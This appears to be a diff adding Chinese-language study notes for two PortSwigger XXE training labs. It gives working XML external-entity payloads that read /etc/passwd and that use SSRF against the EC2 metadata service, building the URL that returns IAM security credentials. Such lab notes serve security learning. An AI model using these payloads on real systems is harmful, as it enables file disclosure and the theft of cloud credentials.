@@ -1,0 +1,36 @@
+###  XXE检索文件 ###
+https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
+注入点在库存检查功能
+POST /product/stock HTTP/2
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+注入外部实体，并引用此实体
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+
+### XXE执行SSRF服务器端请求伪造 ###
+https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
+注入点在库存检查功能
+POST /product/stock HTTP/2
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+注入外部实体，并引用此实体
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+
+每次响应返回之后的路径 latest -> meta-data -> ...
+使用此路径构建出最终url
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+
+@  EC2实例的元数据端点，从实例内部的元数据服务（IMDS），获取IAM凭证 
+EC2 关联的 IAM 角色，下面为<IAM_ROLE_NAME>占位符
+元数据服务 地址固定为 http://169.254.169.254
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM_ROLE_NAME>
+@
